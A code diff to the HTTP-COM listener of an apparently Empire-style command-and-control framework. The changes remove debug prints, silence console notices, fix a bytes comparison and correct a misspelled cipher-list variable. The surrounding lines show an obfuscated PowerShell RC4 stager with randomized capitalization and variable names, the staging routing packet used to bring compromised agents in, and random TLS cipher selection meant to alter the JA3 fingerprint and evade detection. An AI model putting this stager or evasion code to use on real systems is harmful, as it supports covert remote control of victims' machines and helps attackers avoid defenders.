@@ -302,7 +302,6 @@ class Listener(object):
                 stager += helpers.randomize_capitalization('$R={$D,$'+helpers.generate_random_script_var_name("K")+'=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$'+helpers.generate_random_script_var_name("K")+'[$_%$'+helpers.generate_random_script_var_name("K")+'.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 # prebuild the request routing packet for the launcher
-                print("http_com line 306")
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
@@ -747,7 +746,7 @@ class Listener(object):
                                 listenerName = self.options['Name']['Value']
                                 message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                 signal = json.dumps({
-                                    'print': True,
+                                    'print': False,
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -789,11 +788,8 @@ class Listener(object):
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if isinstance(results, str):
-                        print('results type changed listeners/http_com 782')
                         results = results.encode('UTF-8')
                     if results:
-                        print("http_com: 791")
-                        print(results)
                         if results.startswith(b'STAGE2'):
                             # TODO: document the exact results structure returned
                             sessionID = results.split(b' ')[1].strip().decode('UTF-8')
@@ -823,11 +819,11 @@ class Listener(object):
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
-                        elif results == 'VALID':
+                        elif results == b'VALID':
                             listenerName = self.options['Name']['Value']
                             message = "[*] Valid results return by {}".format(clientIP)
                             signal = json.dumps({
-                                'print': True,
+                                'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -858,7 +854,7 @@ class Listener(object):
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 #setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
                 #it every time the listener is launched
-                ipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
+                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
                 selectciph = random.choice(cipherlist)
                 context.set_ciphers(selectciph)
